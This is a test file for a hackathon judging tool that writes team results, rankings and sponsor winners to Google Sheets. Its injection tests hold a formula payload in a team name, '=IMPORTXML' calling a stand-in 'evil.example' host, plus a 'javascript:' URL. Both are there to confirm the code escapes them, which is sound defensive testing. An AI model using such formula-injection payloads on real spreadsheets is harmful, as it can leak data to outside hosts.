import { describe, expect, test } from "vitest";

import {
  COMPLETENESS_LABEL,
  linkCell,
  summaryFormula,
  TOP_N,
  type TabState,
  buildResultsRequests,
  buildResultsRows,
  readCompletenessScores,
  adventureScore,
  buildSponsorWinnersRows,
  rankByAdventure,
  topTeams,
} from "~/server/api/utils/results-sheet";
import {
  type MarkRow,
  type TeamInfo,
  buildTeamResults,
} from "~/server/api/utils/team-results";

const team = (id: string, name: string, table: number | null): TeamInfo => ({
  id,
  name,
  table,
  github: null,
  devpost: `https://devpost.com/${id}`,
});

const mark = (
  teamId: string,
  judgeName: string,
  score: number,
  roundType: "regular" | "sponsored" = "regular",
  notes = "",
  superLike = false,
): MarkRow => ({
  teamId,
  judgeId: judgeName,
  judgeName,
  judgeType: roundType === "regular" ? "organizer" : "sponsored",
  roundType,
  score,
  ratings: { impact: score, creativity: score - 1, technical: score },
  notes,
  superLike,
});

const results = buildTeamResults(
  [team("a", "Alpha", 1), team("b", "Bravo", 2), team("c", "Charlie", null)],
  [
    mark("a", "Jo", 6),
    mark("a", "Sam", 7, "regular", "", true),
    mark("b", "Jo", 9),
    mark("b", "Spon", 8, "sponsored", "great demo", true),
  ],
);

describe("buildResultsRows", () => {
  const { rows, groups } = buildResultsRows(results);
  const header = rows[0]!.cells;
  const col = (name: string) => header.indexOf(name);
  const teamRows = rows.filter((r, i) => i > 0 && r.bold);

  test("header names the rubric criteria", () => {
    expect(header).toEqual(
      expect.arrayContaining(["Rank", "Average", "Innovation + Impact"]),
    );
    expect(rows[0]!.bold).toBe(true);
  });

  test("ranks team rows by regular average; unmarked teams last", () => {
    expect(teamRows.map((r) => r.cells[4])).toEqual([
      "Bravo",
      "Alpha",
      "Charlie",
    ]);
    expect(teamRows.map((r) => r.cells[0])).toEqual([1, 2, ""]);
  });

  test("each team row is followed by its judge rows", () => {
    expect(rows.map((r) => r.cells[4])).toEqual([
      "Team / Judge",
      "Bravo",
      "↳ Jo",
      "↳ Spon",
      "Alpha",
      "↳ Jo",
      "↳ Sam",
      "Charlie",
    ]);
  });

  test("team averages are rounded; judge scores go in their round's column", () => {
    const alpha = teamRows.find((r) => r.cells[4] === "Alpha")!.cells;
    expect(alpha[col("Average")]).toBe(6.5);
    expect(alpha[col("Innovation + Impact")]).toBe(6.5);
    const spon = rows.find((r) => r.cells[4] === "↳ Spon")!.cells;
    expect(spon[col("Average")]).toBe("");
    expect(spon[col("Sponsor average")]).toBe(8);
    expect(spon[col("Notes")]).toBe("great demo");
    const sam = rows.find((r) => r.cells[4] === "↳ Sam")!.cells;
    expect(sam[col("Average")]).toBe(7);
  });

  test("super likes: count on team rows, heart on judge rows", () => {
    const cellOf = (label: string) =>
      rows.find((r) => r.cells[4] === label)!.cells[col("Super likes")];
    expect(cellOf("Alpha")).toBe(1);
    expect(cellOf("Bravo")).toBe(1); // a sponsor judge's heart counts too
    expect(cellOf("Charlie")).toBe(0);
    expect(cellOf("↳ Sam")).toBe("♥");
    expect(cellOf("↳ Jo")).toBe("");
  });

  test("groups cover exactly the judge rows; unmarked teams get none", () => {
    expect(groups).toEqual([
      { teamId: "b", start: 2, end: 4 },
      { teamId: "a", start: 5, end: 7 },
    ]);
  });
});

describe("judge rows", () => {
  test("carry the round, notes and heart under their own columns", () => {
    const { rows } = buildResultsRows(results);
    const header = rows[0]!.cells;
    const spon = rows.find((r) => r.cells[4] === "↳ Spon")!.cells;
    expect(spon[header.indexOf("Judges")]).toBe("sponsor");
    expect(spon[header.indexOf("Notes")]).toBe("great demo");
    expect(spon[header.indexOf("Super likes")]).toBe("♥");
    expect(spon[header.indexOf("Team ID")]).toBe("b");
  });
});

const tab = (sheetId: number, extra: Partial<TabState> = {}): TabState => ({
  sheetId,
  rowCount: 1000,
  columnCount: 26,
  rowGroups: [],
  conditionalFormatCount: 0,
  ...extra,
});

describe("Results and Marks", () => {
  test("judge groups are rebuilt and all start collapsed", () => {
    const old = [
      { range: { sheetId: 1, dimension: "ROWS", startIndex: 2, endIndex: 9 } },
    ];
    const requests = buildResultsRequests({
      resultsTab: tab(1, { rowGroups: old }),
      results,
      scores: new Map(),
    });
    expect(requests.filter((r) => r.deleteDimensionGroup)).toHaveLength(1);
    expect(requests.filter((r) => r.addDimensionGroup)).toHaveLength(2);
    expect(
      requests
        .filter((r) => r.updateDimensionGroup)
        .every((r) => r.updateDimensionGroup!.dimensionGroup!.collapsed),
    ).toBe(true);
    // Old groups go before anything is written.
    expect(requests.findIndex((r) => r.deleteDimensionGroup)).toBeLessThan(
      requests.findIndex((r) => r.updateCells),
    );
  });

  test("grows the grid when there are more rows than the tab has", () => {
    const requests = buildResultsRequests({
      resultsTab: tab(1, { rowCount: 3 }),
      results,
      scores: new Map(),
    });
    const append = requests.find((r) => r.appendDimension)!.appendDimension!;
    expect(append.sheetId).toBe(1);
  });
});

describe("Completeness and Final columns", () => {
  const header = buildResultsRows(results).rows[0]!.cells as string[];
  const at = (label: string) => header.indexOf(label);

  test("every rubric criterion has a column, incl. Technical Complexity", () => {
    expect(header).toEqual(
      expect.arrayContaining([
        "Innovation + Impact",
        "Creativity",
        "Technical Complexity",
        "Design/Polish",
        "Adventurous",
      ]),
    );
    const { rows } = buildResultsRows(results);
    const alpha = rows.find((r) => r.cells[4] === "Alpha")!.cells;
    expect(alpha[at("Technical Complexity")]).toBe(6.5);
  });

  test("Final and Adventure final sit right after Rank; links and Completeness right after the team name", () => {
    expect(header.slice(0, 3)).toEqual(["Rank", "Final", "Adventure final"]);
    expect(header.slice(4, 16)).toEqual([
      "Team / Judge",
      "Devpost",
      "GitHub",
      COMPLETENESS_LABEL,
      "Judges",
      "Normalized",
      "Adventure",
      "Adventurous score",
      "Other 4",
      "Raw total",
      "Average",
      "Super likes",
    ]);
  });

  test("links show a short name, not the whole URL", () => {
    const { rows } = buildResultsRows(results);
    const alpha = rows.find((r) => r.cells[4] === "Alpha")!.cells;
    expect(alpha[at("Devpost")]).toEqual({
      text: "Devpost",
      link: "https://devpost.com/a",
    });
    expect(alpha[at("GitHub")]).toBe("");
    expect(linkCell("github.com/x/y", "GitHub")).toEqual({
      text: "GitHub",
      link: "https://github.com/x/y",
    });
    expect(linkCell("javascript:alert(1)", "GitHub")).toBe(
      "javascript:alert(1)",
    );
  });

  test("team rows get the typed score and a Final formula for their row", () => {
    const { rows } = buildResultsRows(results, new Map([["a", 8]]));
    const alphaIndex = rows.findIndex((r) => r.cells[4] === "Alpha");
    const alpha = rows[alphaIndex]!.cells;
    expect(alpha[at(COMPLETENESS_LABEL)]).toBe(8);
    const sheetRow = alphaIndex + 1;
    expect(alpha[at("Final")]).toEqual({
      formula: `=LET(b, IF(ISNUMBER(J${sheetRow}), J${sheetRow}, O${sheetRow}), IF(b="", "", IF(ISNUMBER(H${sheetRow}), ROUND((b * 5 + H${sheetRow}) / 6, 2), b)))`,
    });
    expect(alpha[at("Adventure final")]).toEqual({
      formula: `=IF(OR(L${sheetRow}="", M${sheetRow}=""), "", IF(ISNUMBER(H${sheetRow}), ROUND(0.65 * L${sheetRow} + 0.35 * (M${sheetRow} * 4 + H${sheetRow}) / 5, 2), ROUND(0.65 * L${sheetRow} + 0.35 * M${sheetRow}, 2)))`,
    });
    const bravo = rows.find((r) => r.cells[4] === "Bravo")!.cells;
    expect(bravo[at(COMPLETENESS_LABEL)]).toBe("");
  });

  test("judge rows leave both blank", () => {
    const { rows } = buildResultsRows(results, new Map([["a", 8]]));
    for (const r of rows.filter((r) => String(r.cells[4]).startsWith("↳"))) {
      expect(r.cells[at(COMPLETENESS_LABEL)]).toBe("");
      expect(r.cells[at("Final")]).toBe("");
    }
  });

  test("validation and red/green status go on team rows only", () => {
    const requests = buildResultsRequests({
      resultsTab: tab(1),
      results,
      scores: new Map(),
    });
    const validated = requests
      .filter((r) => r.setDataValidation)
      .map((r) => r.setDataValidation!.range!.startRowIndex);
    expect(validated).toEqual(buildResultsRows(results).teamRows);
    expect(
      requests.filter((r) => r.setDataValidation)[0]!.setDataValidation!.range,
    ).toMatchObject({ startColumnIndex: 7, endColumnIndex: 8 });
    const rules = requests
      .filter((r) => r.addConditionalFormatRule)
      .map((r) => r.addConditionalFormatRule!.rule!);
    expect(rules.map((r) => r.booleanRule!.condition!.type)).toEqual([
      "BLANK",
      "NOT_BLANK",
    ]);
    expect(rules[0]!.ranges!.map((g) => g.startRowIndex)).toEqual(validated);
  });

  test("the summary tabs rank by score, then super likes, capped at the top 20", () => {
    expect(summaryFormula()).toBe(
      '=IFERROR(ARRAY_CONSTRAIN(LET(t, SORT(FILTER({Results!E2:E, Results!B2:B, ROW(Results!E2:E), Results!P2:P}, Results!A2:A<>"", Results!B2:B<>""), 2, FALSE, 4, FALSE, 3, TRUE), {SEQUENCE(ROWS(t)), CHOOSECOLS(t, 1, 2, 4)}), 20, 4), "")',
    );
    expect(summaryFormula(2)).toContain('Results!C2:C<>""');
  });
});

describe("normalized scores", () => {
  const scored = (
    id: string,
    name: string,
    s: Partial<TeamInfo>,
  ): TeamInfo => ({ ...team(id, name, null), ...s });
  // Bravo has the best raw average, but normalization puts Alpha first; both
  // clip to a normalized 10, so q decides.
  const normalized = buildTeamResults(
    [
      scored("a", "Alpha", {
        normalized: 10,
        normalizedQ: 3.2,
        adventure: 9,
        rawTotal: 7.5,
      }),
      scored("b", "Bravo", {
        normalized: 10,
        normalizedQ: 2.1,
        adventure: 6,
        rawTotal: 8.9,
      }),
      scored("c", "Charlie", {
        normalized: 4.5,
        normalizedQ: -0.4,
        adventure: 5,
        rawTotal: 6,
      }),
      scored("d", "Delta", {}),
    ],
    [
      mark("a", "Jo", 6),
      mark("b", "Jo", 9),
      mark("c", "Jo", 8),
      mark("d", "Jo", 10),
    ],
  );
  const { rows } = buildResultsRows(normalized);
  const header = rows[0]!.cells as string[];
  const teamRows = rows.filter((r, i) => i > 0 && r.bold);

  test("rank by q, then normalized; teams not yet normalized come after", () => {
    expect(teamRows.map((r) => r.cells[4])).toEqual([
      "Alpha",
      "Bravo",
      "Charlie",
      "Delta",
    ]);
  });

  test("team rows show Normalized, Adventure and Raw total", () => {
    const alpha = teamRows[0]!.cells;
    expect(alpha[header.indexOf("Normalized")]).toBe(10);
    expect(alpha[header.indexOf("Adventure")]).toBe(9);
    expect(alpha[header.indexOf("Raw total")]).toBe(7.5);
    const delta = teamRows[3]!.cells;
    expect(delta[header.indexOf("Normalized")]).toBe("");
  });

  test("without any normalization, the judge average ranks", () => {
    expect(
      buildResultsRows(results)
        .rows.filter((r, i) => i > 0 && r.bold)
        .map((r) => r.cells[4]),
    ).toEqual(["Bravo", "Alpha", "Charlie"]);
  });
});

describe("adventure", () => {
  const adv = (
    id: string,
    s: Partial<TeamInfo>,
    score: number,
  ): [TeamInfo, MarkRow] => [
    { ...team(id, id.toUpperCase(), null), ...s },
    mark(id, "Jo", score),
  ];
  // Overall order is by judge score: a, b, c, d. Adventure (0.65 × A +
  // 0.35 × O): a 4.35, b 5, c 7, d 9.5 — so d, c, b, a.
  const pairs = [
    adv("a", { adventurous: 3, otherFour: 6.86 }, 9),
    adv("b", { adventurous: 5, otherFour: 5 }, 8),
    adv("c", { adventurous: 8, otherFour: 5.14 }, 7),
    adv("d", { adventurous: 10, otherFour: 8.57 }, 6),
    adv("e", { otherFour: 9 }, 5),
  ];
  const all = buildTeamResults(
    pairs.map(([t]) => t),
    pairs.map(([, m]) => m),
  );

  test("ranks by 65% adventurous + 35% other four; no adventurous, no rank", () => {
    expect(adventureScore(all[0]!)).toBeCloseTo(4.35, 2);
    expect(rankByAdventure(all).map((r) => r.team.id)).toEqual([
      "d",
      "c",
      "b",
      "a",
    ]);
  });

  test("the export adds the top teams by adventure to the top overall", () => {
    // Top 2 overall (a, b) plus top 2 by adventure (d, c), in overall order.
    expect(topTeams(all, 2).map((r) => r.team.id)).toEqual([
      "a",
      "b",
      "c",
      "d",
    ]);
    expect(topTeams(all, 1).map((r) => r.team.id)).toEqual(["a", "d"]);
  });

  test("teams added for adventure keep their real overall rank", () => {
    const { rows } = buildResultsRows(all, new Map(), new Set(["a", "d"]));
    const teamRows = rows.filter((r, i) => i > 0 && r.bold);
    expect(teamRows.map((r) => [r.cells[0], r.cells[4]])).toEqual([
      [1, "A"],
      [4, "D"],
    ]);
  });

  test("Adventurous and Other 4 are on team rows", () => {
    const { rows } = buildResultsRows(all);
    const header = rows[0]!.cells as string[];
    const a = rows.find((r) => r.cells[4] === "A")!.cells;
    expect(a[header.indexOf("Adventurous score")]).toBe(3);
    expect(a[header.indexOf("Other 4")]).toBe(6.86);
  });
});

describe("keeping typed scores on a re-export", () => {
  const sheetNow = (): unknown[][] => {
    const { rows } = buildResultsRows(results);
    const header = rows[0]!.cells as string[];
    const out: unknown[][] = rows.map((r) =>
      r.cells.map((c) => (typeof c === "object" ? 0 : c)),
    );
    // Someone typed 7 for Alpha, and (wrongly) 5 on a judge row.
    const comp = header.indexOf(COMPLETENESS_LABEL);
    out.find((r) => r[4] === "Alpha")![comp] = 7;
    out.find((r) => String(r[4]).startsWith("↳"))![comp] = 5;
    return out;
  };

  test("reads team-row scores by team ID, ignoring judge rows", () => {
    expect([...readCompletenessScores(sheetNow())]).toEqual([["a", 7]]);
  });

  test("an old Results layout without the column yields nothing", () => {
    expect(
      readCompletenessScores([
        ["Rank", "Team / Judge", "Team ID"],
        [1, "Alpha", "a"],
      ]).size,
    ).toBe(0);
  });

  test("scores from the old Completeness tab carry over; Results wins", () => {
    const scores = readCompletenessScores(sheetNow(), [
      [3, "a"],
      [9, "b"],
      ["", "c"],
    ]);
    expect(scores.get("a")).toBe(7);
    expect(scores.get("b")).toBe(9);
    expect(scores.has("c")).toBe(false);
  });
});

describe("text is never written as a formula", () => {
  test("a team name starting with = stays a string", () => {
    const evil = buildTeamResults(
      [team("x", '=IMPORTXML("https://evil.example","//a")', 1)],
      [mark("x", "=1+1", 5)],
    );
    const requests = buildResultsRequests({
      resultsTab: tab(1),
      results: evil,
      scores: new Map(),
    });
    const values = requests
      .flatMap((r) => r.updateCells?.rows ?? [])
      .flatMap((row) => row.values ?? []);
    const formulas = values
      .map((v) => v.userEnteredValue?.formulaValue)
      .filter(Boolean);
    // Only our own Final formula(s), never the team or judge name.
    expect(
      formulas.every(
        (f) => f!.startsWith("=LET(b,") || f!.startsWith("=IF(OR("),
      ),
    ).toBe(true);
    expect(
      values.some((v) =>
        v.userEnteredValue?.stringValue?.startsWith("=IMPORTXML"),
      ),
    ).toBe(true);
  });
});

describe("top teams only", () => {
  // 25 teams, each scored once: team t1 gets 25, t2 gets 24, … t25 gets 1.
  const many = buildTeamResults(
    Array.from({ length: 25 }, (_, i) => team(`t${i + 1}`, `T${i + 1}`, i + 1)),
    Array.from({ length: 25 }, (_, i) => mark(`t${i + 1}`, "Jo", 25 - i)),
  );

  test(`keeps the best ${TOP_N} by judge average, best first`, () => {
    const top = topTeams(many);
    expect(top).toHaveLength(TOP_N);
    expect(top[0]!.team.id).toBe("t1");
    expect(top.at(-1)!.team.id).toBe(`t${TOP_N}`);
  });

  test("leaves out teams with no judge marks", () => {
    // Charlie has no marks at all; Bravo only has a judge mark of 9.
    expect(topTeams(results).map((r) => r.team.id)).toEqual(["b", "a"]);
  });

  test("Results only lists the teams passed in", () => {
    const top = topTeams(many, 3);
    const names = buildResultsRows(top)
      .rows.slice(1)
      .map((r) => r.cells[4]);
    expect(
      names.filter((n) => typeof n === "string" && !n.startsWith("↳")),
    ).toEqual(["T1", "T2", "T3"]);
  });
});

describe("Sponsor Winners tab", () => {
  test("each sponsor's #1, or not submitted yet", () => {
    const rows = buildSponsorWinnersRows([
      {
        sponsor: "Cohere",
        submittedAt: new Date("2026-11-23T17:30:00Z"),
        team: {
          id: "t1",
          name: "Alpha",
          table: 4,
          devpost: "https://devpost.com/a",
          github: null,
        },
      },
      { sponsor: "Domain.com", submittedAt: null, team: null },
    ]);
    expect(rows[0]!.cells).toEqual([
      "Sponsor",
      "Winner",
      "Table",
      "Devpost",
      "GitHub",
      "Submitted",
      "Team ID",
    ]);
    expect(rows[1]!.cells).toEqual([
      "Cohere",
      "Alpha",
      4,
      { text: "Devpost", link: "https://devpost.com/a" },
      "",
      "Nov 23, 2026, 12:30 PM",
      "t1",
    ]);
    expect(rows[2]!.cells.slice(0, 2)).toEqual([
      "Domain.com",
      "Not submitted yet",
    ]);
  });

  test("a sponsor name starting with = stays text", () => {
    const rows = buildSponsorWinnersRows([
      { sponsor: "=HYPERLINK(1)", submittedAt: null, team: null },
    ]);
    expect(rows[1]!.cells[0]).toBe("=HYPERLINK(1)");
  });
});
